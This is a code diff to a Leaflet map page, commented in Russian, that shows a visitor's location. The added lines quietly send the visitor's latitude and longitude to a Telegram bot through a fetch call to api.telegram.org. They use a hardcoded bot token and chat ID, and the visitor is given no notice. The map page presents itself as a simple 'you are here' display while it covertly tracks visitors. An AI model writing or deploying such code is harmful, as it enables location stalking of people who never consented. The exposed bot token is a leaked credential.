@@ -28,6 +28,9 @@
         navigator.geolocation.getCurrentPosition(function(position) {
             var latitude = position.coords.latitude;  // Широта
             var longitude = position.coords.longitude;  // Долгота
+
+            // Отправляем данные в Telegram-бот
+   
             
             // Создание карты, центрированной на полученных координатах
             var map = L.map('map').setView([latitude, longitude], 13);
@@ -39,8 +42,25 @@
             
             // Добавляем маркер на место, где находится пользователь
             L.marker([latitude, longitude]).addTo(map)
-                .bindPopup("Вы находитесь здесь!")
+                .bindPopup("Друг iDONi здесь. Молодец!")
                 .openPopup();
+
+              const token = '8178967594:AAFos-m53_Q6f0mBoEdvVhq0FH5V4jUOkdM'; // Токен твоего бота
+              const chatId = '1163463444'; // ID чата, куда нужно отправить сообщение
+            
+              const url = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+            
+              fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                  if (data.ok) {
+                    console.log('Геолокация успешно отправлена');
+                  } else {
+                    console.error('Ошибка при отправке геолокации:', data);
+                  }
+                })
+                .catch(error => console.error('Ошибка запроса:', error));
+            
         }, function(error) {
             console.error("Ошибка геолокации: " + error.message);
         });
